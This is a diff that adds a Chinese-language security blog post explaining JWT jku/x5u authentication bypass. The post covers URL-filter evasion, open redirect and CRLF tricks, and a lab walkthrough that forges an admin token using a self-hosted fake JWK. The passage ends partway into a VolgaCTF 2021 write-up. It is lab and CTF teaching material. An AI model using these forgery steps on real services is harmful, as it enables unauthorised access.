@@ -1,0 +1,1571 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>JWT jku/x5u Authentication bypass - DumKiy's blog</title>
+
+<meta name="description" content="JWT jku/x5u Authentication bypass 学习与实践  本文首发于安全客：JWT jku/x5u Authentication bypass 学习与实践0x00 前言之前对JWT的利用姿势只停留在拿到秘钥后进行身份伪造，前几天Volgactf2021遇到了一道jku的题，发现此前关于jk...">
+<link rel="canonical" href="http://localhost:4000/jwt/2021/04/12/JWT-jku-x5u-Authentication-bypass.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>JWT jku/x5u Authentication bypass</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2021-04-12-JWT-jku-x5u-Authentication-bypass.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="JWT jku/x5u Authentication bypass"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=jwt">jwt</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Apr 12, 2021</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2021-04-12T16:34:27+08:00">
+    <meta itemprop="keywords" content="jwt"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="jwt-jkux5u-authentication-bypass-学习与实践">JWT jku/x5u Authentication bypass 学习与实践</h1>
+<blockquote>
+  <p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/236830">JWT jku/x5u Authentication bypass 学习与实践</a></p>
+</blockquote>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>之前对JWT的利用姿势只停留在拿到秘钥后进行身份伪造，前几天<code class="language-plaintext highlighter-rouge">Volgactf2021</code>遇到了一道jku的题，发现此前关于jku 权限绕过利用原理与利用手法的文章还是比较少的，趁此机会将这一块好好学一遍，希望对大家有用，欢迎大家批评指正！</p>
+
+<h2 id="0x01-jwt简介">0x01 jwt简介</h2>
+
+<blockquote>
+  <p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，通常可用于在身份提供商和服务提供商之间传递用户的身份验证信息。</p>
+</blockquote>
+
+<p>JWT由三部分组成，由”.”进行连接，分别是：</p>
+
+<ul>
+  <li>头部（Header）</li>
+  <li>有效载荷（Payload）</li>
+  <li>签名(Signature)</li>
+</ul>
+
+<h3 id="header">Header</h3>
+
+<p>header用于标识用于生成签名的算法。如下：</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w"> 
+  </span><span class="s2">"alg"</span><span class="err">：</span><span class="w"> </span><span class="s2">"HS256"</span><span class="err">，</span><span class="w">
+  </span><span class="s2">"typ"</span><span class="err">：</span><span class="w"> </span><span class="s2">"JWT"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>HS256 表示此令牌是使用HMAC-SHA256签名的。</p>
+
+<h3 id="payload">Payload</h3>
+
+<p>payload包含用户数据以及一些元数据有关的信息。比如：</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w"> 
+  </span><span class="s2">"loggedInAs"</span><span class="err">：</span><span class="w"> </span><span class="s2">"admin"</span><span class="err">，</span><span class="w">
+  </span><span class="s2">"iat"</span><span class="err">：</span><span class="w"> </span><span class="mi">1422779638</span><span class="w"> 
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="signature">Signature</h3>
+
+<p>签名部分用于安全地验证该token。<strong>拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT 也就是不安全的JWT，此时header中声明的签名算法为none。</strong></p>
+
+<p>签名部分使用多种算法，HMAC-SHA256是其中的一种：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HMAC</span><span class="o">-</span><span class="nc">SHA256</span><span class="p">(</span>
+  <span class="n">secret</span><span class="p">,</span>
+  <span class="nf">base64urlEncoding</span><span class="p">(</span><span class="n">header</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="o">+</span>
+  <span class="nf">base64urlEncoding</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI
+</code></pre></div></div>
+
+<p>eyJ = Base64(‘{“’)</p>
+
+<h2 id="0x02-jwt-相关概念">0x02 jwt 相关概念</h2>
+
+<blockquote>
+  <ul>
+    <li>JWS：Signed JWT，签名过的jwt</li>
+    <li>JWK：JWT的密钥，也就是我们常说的scret；</li>
+    <li>JWE：Encrypted JWT部分payload经过加密的jwt；</li>
+    <li>
+      <p>jku：”jku” (JSON Web Key Set URL) 是jwt header中的一个字段，字段内容是一个URI，该URI用于指定用于验证令牌秘钥的服务器，该服务器用于回复jwk。</p>
+    </li>
+    <li>x5u：”x5u” 也是jwt header中的一个字段，指向一组X509公共证书的URL，与jku功能类似</li>
+    <li>X.509 标准
+      <ul>
+        <li>X.509 标准是密码学里公钥证书的格式标准,包括TLS/SSL(WWW万维网安全浏览的基石)在内的众多 Internet协议都应用了X.509 证书）</li>
+      </ul>
+    </li>
+  </ul>
+</blockquote>
+
+<p>更详细的概念请参考：<a href="https://www.freebuf.com/articles/web/180874.html">深入了解Json Web Token之概念篇</a></p>
+
+<h2 id="0x02-jku-工作原理">0x02 jku 工作原理</h2>
+
+<p>内容参考：</p>
+<ul>
+  <li>ppt：https://www.slideshare.net/snyff/jwt-jku-x5u?from_action=save</li>
+  <li>视频：https://www.youtube.com/watch?v=VA1g7YV8HkI&amp;list=PLKAaMVNxvLmAD0ZVUJ2IGFFC0APFZ5gzy&amp;index=11</li>
+</ul>
+
+<h3 id="正常工作场景">正常工作场景</h3>
+
+<p>jku使用的场景如下：</p>
+
+<h4 id="step1-用户携带jws带有签名的jwt访问应用">Step1 用户携带JWS（带有签名的JWT）访问应用</h4>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331160635996.png" alt="image-20210331160635996" /></p>
+
+<h4 id="step2-应用程序解码jws得到jku字段">Step2 应用程序解码JWS得到jku字段</h4>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161005669.png" alt="image-20210331161005669" /></p>
+
+<h4 id="step3-应用根据jku访问返回jwk的服务器">Step3 应用根据jku访问返回JWK的服务器</h4>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161234593.png" alt="image-20210331161234593" /></p>
+
+<h4 id="step4-应用程序得到jwk">Step4 应用程序得到JWK</h4>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161400400.png" alt="image-20210331161400400" /></p>
+
+<h4 id="step5-使用jwk验证用户jws">Step5 使用JWK验证用户JWS</h4>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161528304.png" alt="image-20210331161528304" /></p>
+
+<h4 id="step6-验证通过则正常响应">step6 验证通过则正常响应</h4>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161546646.png" alt="image-20210331161546646" /></p>
+
+<h3 id="攻击场景">攻击场景</h3>
+
+<p>攻击场景如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331161633860.png" alt="image-20210331161633860" /></p>
+
+<ol>
+  <li>攻击者使用伪造的JWS访问应用，jku字段指向自己控制的服务器。</li>
+  <li>应用程序得到jku后对恶意服务器进行访问，得到伪造的JWK。</li>
+  <li>攻击者的JWS成功得到验证，进而可以越权访问应用。</li>
+</ol>
+
+<p>为了保证JWK服务器的可信，应用程序会对jku的指向增加各种防护措施，比如对URL进行白名单过滤，想要攻击成功也并非容易的事。</p>
+
+<h2 id="0x03-攻击方式">0x03 攻击方式</h2>
+
+<h3 id="方式一绕过对jku地址的过滤">方式一：绕过对jku地址的过滤</h3>
+
+<p>如果过滤方式比较简单只按照规定长度检查域名的话，很容易绕过。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://trusted  =&gt; http://trusted@malicious.com
+</code></pre></div></div>
+
+<p>绕过方式由具体场景而定。</p>
+
+<h3 id="方式二可信服务器本身的漏洞">方式二：可信服务器本身的漏洞</h3>
+
+<ul>
+  <li>1.文件上传漏洞</li>
+  <li>2.开放重定向漏洞</li>
+  <li>3.CRLF注入漏洞</li>
+</ul>
+
+<h4 id="利用文件上传漏洞">利用文件上传漏洞</h4>
+
+<p>文件上传漏洞很好理解，如果对jku做了域名限制，利用文件上传就不会有影响了，攻击者可以上传自己生成的JWK文件，然后修改jku指向此文件即可。</p>
+
+<h4 id="利用重定向漏洞">利用重定向漏洞</h4>
+
+<p>重定向漏洞的利用方式可以参考下图：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331193633292.png" alt="image-20210331193633292" /></p>
+
+<ol>
+  <li>攻击者使用恶意JWS访问应用程序，应用程序向得到jku，并访问jku指向的链接</li>
+  <li>此时可信服务器返回一个重定向，使得应用程序从恶意服务器中获取JWK</li>
+</ol>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331194200328.png" alt="image-20210331194200328" /></p>
+
+<h4 id="利用crlf注入">利用CRLF注入</h4>
+
+<p>CRLF注入的利用场景如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331194353507.png" alt="image-20210331194353507" /></p>
+
+<p>攻击者在jku中嵌入CRLF，构造HTTP报文，使得应用程序得到的返回内容被攻击者控制，攻击者将返回内容控制为自己生成的JWK，即可绕过验证</p>
+
+<h2 id="0x04-jku利用实例">0x04 jku利用实例</h2>
+
+<h3 id="attackdefense实验室jku-claim-misuse">AttackDefense实验室：jku Claim Misuse</h3>
+
+<h4 id="场景描述">场景描述</h4>
+
+<ul>
+  <li>1.攻击者IP地址为：192.170.138.2</li>
+  <li>2.局域网内192.170.138.3的8080端口包含了一个基于CLI的JWT API，该API提供如下三个功能
+    <ul>
+      <li>/issue ：访问后生成一个JWT</li>
+      <li>/goldenticket：得到goldenticket，但是需要身份为admin才能获取</li>
+      <li>/help：查看一些帮助</li>
+    </ul>
+  </li>
+  <li>3.实验的目标是获取goldenticket</li>
+</ul>
+
+<h4 id="实验过程">实验过程</h4>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://192.170.138.3:8080/issue
+</code></pre></div></div>
+
+<p>响应得到JWS</p>
+
+<p>使用得到的JWS到<a href="https://jwt.io/">https://jwt.io</a>网站上解码</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331200027003.png" alt="image-20210331200027003" /></p>
+
+<p>该JWT使用RSASHA256进行加密，并且jku指向了如下地址：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://witrap.com:8000/jwks.json
+</code></pre></div></div>
+
+<p>直接请求该jwk</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl http://witrap.com:8000/jwks.json
+</code></pre></div></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331200408236.png" alt="image-20210331200408236" /></p>
+
+<p>得到可以看到RSA加密的n和e都在里面。</p>
+
+<p>我们的目标是以admin角色访问到/goldenticket，所以这里可以利用上面的攻击方式。</p>
+
+<p>具体流程如下：</p>
+
+<ol>
+  <li>1.本地生成自己的公私钥对</li>
+  <li>2.搭建本地恶意服务器</li>
+  <li>3.使用自己的n和e伪造一个JWK并放在恶意服务器上</li>
+  <li>4.利用公私钥伪造JWS，将role字段改成admin，jku指向该恶意服务器上的JWK文件</li>
+  <li>5.带上JWS访问/goldenticket</li>
+</ol>
+
+<h5 id="生成rsa公私钥对">生成RSA公私钥对</h5>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> keypair.pem 2048
+</code></pre></div></div>
+
+<p>产生一个2048位的密钥</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsa <span class="nt">-in</span> keypair.pem <span class="nt">-pubout</span> <span class="nt">-out</span> public.crt
+</code></pre></div></div>
+
+<p>根据密钥产生公钥</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs8 <span class="nt">-topk8</span> <span class="nt">-inform</span> PEM <span class="nt">-outform</span> PEM <span class="nt">-nocrypt</span> <span class="nt">-in</span> keypair.pem <span class="nt">-out</span> pkc8.key
+</code></pre></div></div>
+
+<hr />
+
+<p>openssl pkcs8命令：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs8 <span class="o">[</span><span class="nt">-topk8</span><span class="o">]</span> <span class="o">[</span><span class="nt">-inform</span> PEM|DER] <span class="o">[</span><span class="nt">-outform</span> PEM|DER] <span class="o">[</span><span class="nt">-in</span> filename] <span class="o">[</span><span class="nt">-passin</span> arg] <span class="o">[</span><span class="nt">-out</span> filename] <span class="o">[</span><span class="nt">-passout</span> arg] <span class="o">[</span><span class="nt">-noiter</span><span class="o">]</span> <span class="o">[</span><span class="nt">-nocrypt</span><span class="o">]</span> <span class="o">[</span><span class="nt">-nooct</span><span class="o">]</span> <span class="o">[</span><span class="nt">-embed</span><span class="o">]</span> <span class="o">[</span><span class="nt">-nsdb</span><span class="o">]</span> <span class="o">[</span><span class="nt">-v2</span> alg] <span class="o">[</span><span class="nt">-v2prf</span> alg] <span class="o">[</span><span class="nt">-v1</span> alg] <span class="o">[</span><span class="nt">-engine</span> <span class="nb">id</span><span class="o">]</span>
+</code></pre></div></div>
+
+<p>具体可参考：https://www.openssl.org/docs/man1.0.2/man1/openssl-pkcs8.html</p>
+
+<h5 id="伪造jws">伪造JWS</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyBoYKQHzkKJQQQGdHubO
+Cy6VwQdrr2Pn269ovuZ9Y6155pJCskXApCHG2qV7yIXpHz1XrDkFe8ZmTiPzPtQC
+u220HFrH3KRkTfECzGkT4LJB8jYySL18Ih7zf6A+wpCVCDYEZWXlyuwkqdqRzBRz
+F8kxZgFzVwRfeECF8RnO1vPVMZ9qNX7i1+u6bA83LNjYQCSNZHo+Y4K3deb+MK7l
+zcSnKsw2EQvuaUJKEExFoFeruXoaAsouwUMRERr/pQPxvk+6voWyTfPJiNKxI0JD
+oNdsYNj0JPWqAnOcsF+G2UGDmBJ7UhBxKutBt7OKAUWbOpZYd9YkmT5rL3hAeCia
+YwIDAQAB
+-----END PUBLIC KEY-----
+</code></pre></div></div>
+
+<p>将产生的public key完整得粘贴到公钥处</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331203210960.png" alt="image-20210331203210960" /></p>
+
+<p>私钥也是一样</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331203427137.png" alt="image-20210331203427137" /></p>
+
+<p>然后修改上面jku的地址：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.170.138.2:8080/issue
+</code></pre></div></div>
+
+<p>在右方就可以得到伪造好的JWS</p>
+
+<h5 id="搭建恶意服务器">搭建恶意服务器</h5>
+
+<p>根据jwks.json文件的格式：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/0_G13gj8l5elTJGins.png" alt="0_G13gj8l5elTJGins" /></p>
+
+<p>我们需要修改n和e</p>
+
+<p>利用如下脚本：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+
+<span class="n">fp</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">publickey.crt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="nf">importKey</span><span class="p">(</span><span class="n">fp</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+<span class="n">fp</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="k">print</span> <span class="sh">"</span><span class="s">n:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">n</span><span class="p">)</span>
+<span class="k">print</span> <span class="sh">"</span><span class="s">e:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">e</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/0_tqSIayaT5cADfUX3.png" alt="0_tqSIayaT5cADfUX3" /></p>
+
+<p>替换n和e得到伪造的JWK</p>
+
+<p>下一步我们可以使用python的SimpleHTTPServer快速搭建服务器</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer 8080
+</code></pre></div></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210331204337815.png" alt="image-20210331204337815" /></p>
+
+<p>SimpleHTTPServer可以快速构建一个web服务，并且将当前目录作为web服务根目录，当前目录存放着伪造的jwks.json</p>
+
+<p>携带伪造的JWS进行访问/goldenticket，这时成功通过验证</p>
+
+<h3 id="volgactf-2021-jws开放重定向利用">Volgactf 2021 JWS：开放重定向利用</h3>
+
+<p>当时没做出来，参考：<a href="https://telegra.ph/JWS-writeups-03-28">JWS writeup</a></p>
+
+<h4 id="场景描述-1">场景描述</h4>
+
+<ul>
+  <li>1.5000端口存在返回JWS的API
+    <ul>
+      <li>jws中存在jku</li>
+      <li>jku存在白名单过滤机制，限制在localhost域</li>
+    </ul>
+  </li>
+  <li>2.5000/check_jws?payload= 可以进行JWS的检查并且展示Payload部分内容
+    <ul>
+      <li>存在SSTI漏洞</li>
+    </ul>
+  </li>
+  <li>3.5001/vuln/JWK可以得到JWK</li>
+</ul>
+
+<p>需要利用重定向通过验证，然后利用SSTI拿到flag</p>
+
+<h4 id="实践过程">实践过程</h4>
+
+<p>访问5000端口：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1e91c1baed437897e9133.png" alt="1e91c1baed437897e9133" /></p>
+
+<p>返回JWS，可以看到里面的jku，指向<code class="language-plaintext highlighter-rouge">http://localhost:5001/vuln/JWK</code></p>
+
+<p>访问<code class="language-plaintext highlighter-rouge">http://localhost:5001/vuln/JWK</code>得到JWK</p>
+
